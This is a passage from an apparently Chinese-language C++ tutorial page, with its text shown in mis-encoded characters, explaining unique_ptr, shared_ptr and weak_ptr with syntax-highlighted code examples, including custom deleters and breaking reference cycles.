class="string">&quot;World&quot;</span>))</span></span>;</span><br></pre></td></tr></table></figure></li></ul><p><strong>æ‰€æœ‰æƒè½¬ç§» (ç§»åŠ¨):</strong> <code>unique_ptr</code> ä¸èƒ½å¤åˆ¶ï¼Œä½†å¯ä»¥é€šè¿‡ <code>std::move()</code> è½¬ç§»æ‰€æœ‰æƒã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="keyword">int</span>&gt; ptr1 = <span class="built_in">std</span>::make_unique&lt;<span class="keyword">int</span>&gt;(<span class="number">100</span>);</span><br><span class="line"><span class="comment">// std::unique_ptr&lt;int&gt; ptr2 = ptr1; // é”™è¯¯ï¼ä¸èƒ½å¤åˆ¶</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="keyword">int</span>&gt; ptr3 = <span class="built_in">std</span>::move(ptr1); <span class="comment">// OKï¼æ‰€æœ‰æƒä» ptr1 è½¬ç§»åˆ° ptr3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ­¤æ—¶ ptr1 å˜ä¸º nullptr</span></span><br><span class="line"><span class="keyword">if</span> (!ptr1) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ptr1 is now null.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ptr3) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ptr3 holds the value: &quot;</span> &lt;&lt; *ptr3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 100</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡½æ•°å¯ä»¥è¿”å› <code>unique_ptr</code>ï¼Œè¿™ä¼šè‡ªåŠ¨è§¦å‘ç§»åŠ¨è¯­ä¹‰ï¼Œå°†æ‰€æœ‰æƒè½¬ç§»ç»™è°ƒç”¨è€…ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; <span class="title">create_string</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">std</span>::make_unique&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;(<span class="string">&quot;Created String&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; owned_ptr = create_string(); <span class="comment">// æ‰€æœ‰æƒè½¬ç§»ç»™ owned_ptr</span></span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨:</strong> åƒæ™®é€šæŒ‡é’ˆä¸€æ ·ä½¿ç”¨ <code>*</code> å’Œ <code>-&gt;</code>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; uptr = <span class="built_in">std</span>::make_unique&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value: &quot;</span> &lt;&lt; *uptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length: &quot;</span> &lt;&lt; uptr-&gt;length() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><p><strong>å…¶ä»–æ“ä½œ:</strong></p><ul><li>  <code>get()</code>: è¿”å›æŒ‡å‘è¢«ç®¡ç†å¯¹è±¡çš„åŸå§‹æŒ‡é’ˆï¼ˆä½†ä¸è½¬ç§»æ‰€æœ‰æƒï¼‰ã€‚å°å¿ƒä½¿ç”¨ï¼Œé¿å…æ‰‹åŠ¨ <code>delete</code> è¿™ä¸ªæŒ‡é’ˆã€‚</li><li>  <code>reset(p)</code>: é”€æ¯å½“å‰ç®¡ç†çš„å¯¹è±¡ï¼ˆå¦‚æœæœ‰ï¼‰ï¼Œå¹¶æ¥ç®¡æŒ‡é’ˆ <code>p</code> æŒ‡å‘çš„æ–°å¯¹è±¡ã€‚</li><li>  <code>reset()</code>: é”€æ¯å½“å‰ç®¡ç†çš„å¯¹è±¡ï¼Œå¹¶å°† <code>unique_ptr</code> ç½®ä¸ºç©ºã€‚</li><li>  <code>release()</code>: æ”¾å¼ƒå¯¹æŒ‡é’ˆçš„æ‰€æœ‰æƒï¼Œè¿”å›åŸå§‹æŒ‡é’ˆï¼Œå¹¶å°† <code>unique_ptr</code> ç½®ä¸ºç©ºã€‚è°ƒç”¨è€…<strong>è´Ÿè´£</strong>æ‰‹åŠ¨ <code>delete</code> è¿”å›çš„æŒ‡é’ˆã€‚</li></ul><p><strong>ç”¨äºæ•°ç»„:</strong> <code>unique_ptr</code> å¯ä»¥ç®¡ç†åŠ¨æ€åˆ†é…çš„æ•°ç»„ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºæŒ‡å‘åŒ…å« 5 ä¸ª int çš„æ•°ç»„çš„ unique_ptr</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="keyword">int</span>[]&gt; uptr_arr = <span class="built_in">std</span>::make_unique&lt;<span class="keyword">int</span>[]&gt;(<span class="number">5</span>); <span class="comment">// C++14</span></span><br><span class="line"><span class="comment">// æˆ–è€… std::unique_ptr&lt;int[]&gt; uptr_arr_cpp11(new int[5]); // C++11</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ operator[] è®¿é—®å…ƒç´ </span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i) &#123;</span><br><span class="line">    uptr_arr[i] = i * <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; uptr_arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">// ç¦»å¼€ä½œç”¨åŸŸæ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ delete[]</span></span><br></pre></td></tr></table></figure><p><strong>è‡ªå®šä¹‰åˆ é™¤å™¨:</strong> å¯ä»¥ä¸º <code>unique_ptr</code> æŒ‡å®šè‡ªå®šä¹‰çš„åˆ é™¤å™¨ï¼Œç”¨äºæ‰§è¡Œéæ ‡å‡†çš„èµ„æºé‡Šæ”¾æ“ä½œï¼ˆå¦‚å…³é—­æ–‡ä»¶å¥æŸ„ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt; // for FILE, fopen, fclose</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FileCloser</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(FILE* fp)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (fp) &#123;</span><br><span class="line">            <span class="built_in">std</span>::fclose(fp);</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;File closed.\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨è‡ªå®šä¹‰åˆ é™¤å™¨ FileCloser</span></span><br><span class="line">    std::unique_ptr&lt;FILE, FileCloser&gt; file_ptr(std::fopen(&quot;test.txt&quot;, &quot;w&quot;));</span><br><span class="line">    <span class="keyword">if</span> (file_ptr) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">fprintf</span>(file_ptr.get(), <span class="string">&quot;Hello from unique_ptr with custom deleter.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å½“ file_ptr ç¦»å¼€ä½œç”¨åŸŸæ—¶ï¼ŒFileCloser::operator() ä¼šè¢«è°ƒç”¨ä»¥å…³é—­æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="std-shared-ptr"><a href="#std-shared-ptr" class="headerlink" title="std::shared_ptr"></a><code>std::shared_ptr</code></h4><p><code>shared_ptr</code> ç”¨äºèµ„æºå¯èƒ½è¢«å¤šä¸ªæŒ‡é’ˆå…±äº«æ‰€æœ‰æƒçš„åœºæ™¯ã€‚</p><p><strong>åˆ›å»º:</strong></p><ul><li><strong>æ¨èæ–¹å¼:</strong> ä½¿ç”¨ <code>std::make_shared&lt;T&gt;(args...)</code>ã€‚å®ƒé€šå¸¸æ›´é«˜æ•ˆï¼Œå› ä¸ºå®ƒå¯ä»¥åœ¨ä¸€æ¬¡å†…å­˜åˆ†é…ä¸­åŒæ—¶ä¸ºå¯¹è±¡å’Œå¼•ç”¨è®¡æ•°æ§åˆ¶å—åˆ†é…å†…å­˜ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> sptr_int = <span class="built_in">std</span>::make_shared&lt;<span class="keyword">int</span>&gt;(<span class="number">50</span>);</span><br><span class="line"><span class="keyword">auto</span> sptr_str = <span class="built_in">std</span>::make_shared&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;(<span class="string">&quot;Shared&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><strong>ä½¿ç”¨ <code>new</code>:</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sptr_int_new</span><span class="params">(<span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">60</span>))</span></span>;</span><br><span class="line"><span class="comment">// æ³¨æ„ï¼šä¸è¦å°†åŒä¸€ä¸ªåŸå§‹æŒ‡é’ˆç”¨äºåˆå§‹åŒ–å¤šä¸ª shared_ptrï¼Œåº”é€šè¿‡å¤åˆ¶å·²æœ‰çš„ shared_ptr æ¥å…±äº«</span></span><br><span class="line"><span class="comment">// int* raw_ptr = new int(70);</span></span><br><span class="line"><span class="comment">// std::shared_ptr&lt;int&gt; sp1(raw_ptr);</span></span><br><span class="line"><span class="comment">// std::shared_ptr&lt;int&gt; sp2(raw_ptr); // é”™è¯¯ï¼ä¼šå¯¼è‡´é‡å¤ delete</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>å…±äº«æ‰€æœ‰æƒå’Œå¼•ç”¨è®¡æ•°:</strong> å¤åˆ¶ <code>shared_ptr</code> ä¼šå¢åŠ å¼•ç”¨è®¡æ•°ï¼Œé”€æ¯æˆ–é‡ç½® <code>shared_ptr</code> ä¼šå‡å°‘å¼•ç”¨è®¡æ•°ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;<span class="keyword">int</span>&gt; sp1 = <span class="built_in">std</span>::make_shared&lt;<span class="keyword">int</span>&gt;(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sp1 use_count: &quot;</span> &lt;&lt; sp1.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;<span class="keyword">int</span>&gt; sp2 = sp1; <span class="comment">// å¤åˆ¶ï¼Œå¼•ç”¨è®¡æ•°å¢åŠ </span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sp1 use_count: &quot;</span> &lt;&lt; sp1.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 2</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sp2 use_count: &quot;</span> &lt;&lt; sp2.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 2</span></span><br><span class="line"></span><br><span class="line">sp1.reset(); <span class="comment">// sp1 ä¸å†æŒ‡å‘å¯¹è±¡ï¼Œå¼•ç”¨è®¡æ•°å‡å°‘</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sp1 reset. sp2 use_count: &quot;</span> &lt;&lt; sp2.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å½“ sp2 ç¦»å¼€ä½œç”¨åŸŸæ—¶ï¼Œå¼•ç”¨è®¡æ•°å˜ä¸º 0ï¼Œå¯¹è±¡è¢«åˆ é™¤</span></span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨:</strong> ä¸ <code>unique_ptr</code> ç±»ä¼¼ï¼Œä½¿ç”¨ <code>*</code> å’Œ <code>-&gt;</code>ã€‚</p><p><strong>å…¶ä»–æ“ä½œ:</strong></p><ul><li>  <code>get()</code>: è¿”å›åŸå§‹æŒ‡é’ˆã€‚</li><li>  <code>reset()</code> / <code>reset(p)</code>: å‡å°‘å½“å‰å¯¹è±¡çš„å¼•ç”¨è®¡æ•°ï¼ˆå¦‚æœä¸º 0 åˆ™åˆ é™¤ï¼‰ï¼Œå¹¶å¯é€‰åœ°æ¥ç®¡æ–°æŒ‡é’ˆ <code>p</code>ã€‚</li><li>  <code>use_count()</code>: è¿”å›å½“å‰çš„å¼•ç”¨è®¡æ•°å€¼ï¼ˆä¸»è¦ç”¨äºè°ƒè¯•ï¼‰ã€‚</li></ul><p><strong>å¾ªç¯å¼•ç”¨é—®é¢˜:</strong> å¦‚æœä¸¤ä¸ªå¯¹è±¡é€šè¿‡ <code>shared_ptr</code> ç›¸äº’å¼•ç”¨ï¼Œå®ƒä»¬çš„å¼•ç”¨è®¡æ•°æ°¸è¿œä¸ä¼šå˜ä¸º 0ï¼Œå³ä½¿æ²¡æœ‰å¤–éƒ¨æŒ‡é’ˆæŒ‡å‘å®ƒä»¬ï¼Œä¹Ÿä¼šå¯¼è‡´å†…å­˜æ³„æ¼ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NodeB</span>;</span> <span class="comment">// å‰å‘å£°æ˜</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NodeA</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;NodeB&gt; ptrB;</span><br><span class="line">    ~NodeA() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NodeA destroyed\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NodeB</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;NodeA&gt; ptrA;</span><br><span class="line">    ~NodeB() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NodeB destroyed\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;NodeA&gt; pa = <span class="built_in">std</span>::make_shared&lt;NodeA&gt;();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;NodeB&gt; pb = <span class="built_in">std</span>::make_shared&lt;NodeB&gt;();</span><br><span class="line"></span><br><span class="line">    pa-&gt;ptrB = pb; <span class="comment">// pa æŒ‡å‘ pb</span></span><br><span class="line">    pb-&gt;ptrA = pa; <span class="comment">// pb æŒ‡å‘ pa (å½¢æˆå¾ªç¯å¼•ç”¨)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;pa use_count: &quot;</span> &lt;&lt; pa.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 2 (pa å’Œ pb-&gt;ptrA)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;pb use_count: &quot;</span> &lt;&lt; pb.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 2 (pb å’Œ pa-&gt;ptrB)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å½“ pa å’Œ pb ç¦»å¼€ä½œç”¨åŸŸæ—¶ï¼Œå¼•ç”¨è®¡æ•°éƒ½åªå‡åˆ° 1ï¼Œææ„å‡½æ•°ä¸ä¼šè¢«è°ƒç”¨ï¼Œå†…å­˜æ³„æ¼ï¼</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è§£å†³æ–¹æ¡ˆ:</strong> ä½¿ç”¨ <code>std::weak_ptr</code> æ‰“ç ´å¾ªç¯ã€‚</p><h4 id="std-weak-ptr"><a href="#std-weak-ptr" class="headerlink" title="std::weak_ptr"></a><code>std::weak_ptr</code></h4><p><code>weak_ptr</code> ç”¨äºâ€œè§‚å¯Ÿâ€ç”± <code>shared_ptr</code> ç®¡ç†çš„å¯¹è±¡ï¼Œä½†å®ƒæœ¬èº«ä¸æ‹¥æœ‰å¯¹è±¡ï¼Œä¹Ÿä¸å½±å“å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸï¼ˆä¸æ”¹å˜å¼•ç”¨è®¡æ•°ï¼‰ã€‚</p><p><strong>åˆ›å»º:</strong> åªèƒ½ä» <code>shared_ptr</code> æˆ–å¦ä¸€ä¸ª <code>weak_ptr</code> åˆ›å»ºã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;<span class="keyword">int</span>&gt; sp = <span class="built_in">std</span>::make_shared&lt;<span class="keyword">int</span>&gt;(<span class="number">10</span>);</span><br><span class="line"><span class="built_in">std</span>::weak_ptr&lt;<span class="keyword">int</span>&gt; wp = sp; <span class="comment">// wp è§‚å¯Ÿ sp ç®¡ç†çš„å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sp use_count: &quot;</span> &lt;&lt; sp.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 1</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;wp use_count: &quot;</span> &lt;&lt; wp.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 1 (weak_ptr::use_count è¿”å›çš„æ˜¯ shared_ptr çš„è®¡æ•°)</span></span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨:</strong></p><ul><li>  <code>expired()</code>: æ£€æŸ¥æ‰€è§‚å¯Ÿçš„å¯¹è±¡æ˜¯å¦å·²è¢«é”€æ¯ï¼ˆå¯¹åº”çš„ <code>shared_ptr</code> å¼•ç”¨è®¡æ•°æ˜¯å¦ä¸º 0ï¼‰ã€‚</li><li><code>lock()</code>: <strong>å…³é”®æ–¹æ³•</strong>ã€‚å°è¯•è·å–ä¸€ä¸ªæŒ‡å‘æ‰€è§‚å¯Ÿå¯¹è±¡çš„ <code>shared_ptr</code>ã€‚<ul><li>  å¦‚æœå¯¹è±¡ä»ç„¶å­˜åœ¨ï¼Œè¿”å›ä¸€ä¸ªæœ‰æ•ˆçš„ <code>shared_ptr</code>ï¼ˆå¹¶å¢åŠ å¼•ç”¨è®¡æ•°ï¼‰ã€‚</li><li>å¦‚æœå¯¹è±¡å·²è¢«é”€æ¯ï¼Œè¿”å›ä¸€ä¸ªç©ºçš„ <code>shared_ptr</code>ã€‚<br>è¿™æ˜¯è®¿é—® <code>weak_ptr</code> æŒ‡å‘å¯¹è±¡çš„<strong>å®‰å…¨</strong>æ–¹å¼ã€‚</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (wp.expired()) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Object observed by wp is expired.\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;<span class="keyword">int</span>&gt; locked_sp = wp.lock(); <span class="comment">// å°è¯•è·å– shared_ptr</span></span><br><span class="line">    <span class="keyword">if</span> (locked_sp) &#123; <span class="comment">// æ£€æŸ¥æ˜¯å¦æˆåŠŸè·å–</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Object still alive. Value: &quot;</span> &lt;&lt; *locked_sp &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;use_count after lock: &quot;</span> &lt;&lt; locked_sp.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// å¼•ç”¨è®¡æ•°å¢åŠ </span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Object expired between check and lock.\n&quot;</span>; <span class="comment">// å¯èƒ½å‘ç”Ÿ (å¤šçº¿ç¨‹)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// locked_sp ç¦»å¼€ä½œç”¨åŸŸï¼Œå¼•ç”¨è®¡æ•°å‡å°‘</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sp.reset(); <span class="comment">// åŸå§‹ shared_ptr é‡Šæ”¾å¯¹è±¡</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original shared_ptr reset.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;<span class="keyword">int</span>&gt; locked_sp_after_reset = wp.lock();</span><br><span class="line"><span class="keyword">if</span> (!locked_sp_after_reset) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;weak_ptr lock() failed after object destruction.\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è§£å†³å¾ªç¯å¼•ç”¨:</strong> åœ¨å¾ªç¯å¼•ç”¨çš„åœºæ™¯ä¸­ï¼Œè®©å…¶ä¸­ä¸€ä¸ªæŒ‡é’ˆï¼ˆæˆ–ä¸¤ä¸ªï¼‰æˆä¸º <code>weak_ptr</code>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NodeB_weak</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NodeA_weak</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;NodeB_weak&gt; ptrB; <span class="comment">// NodeA å¼ºå¼•ç”¨ NodeB</span></span><br><span class="line">    ~NodeA_weak() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NodeA_weak destroyed\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NodeB_weak</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::weak_ptr&lt;NodeA_weak&gt; ptrA; <span class="comment">// NodeB å¼±å¼•ç”¨ NodeA (æ‰“ç ´å¾ªç¯)</span></span><br><span class="line">    ~NodeB_weak() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NodeB_weak destroyed\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;NodeA_weak&gt; pa = <span class="built_in">std</span>::make_shared&lt;NodeA_weak&gt;();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;NodeB_weak&gt; pb = <span class="built_in">std</span>::make_shared&lt;NodeB_weak&gt;();</span><br><span class="line"></span><br><span class="line">    pa-&gt;ptrB = pb;</span><br><span class="line">    pb-&gt;ptrA = pa; <span class="comment">// pa èµ‹å€¼ç»™ weak_ptrï¼Œä¸å¢åŠ  pa çš„å¼•ç”¨è®¡æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span 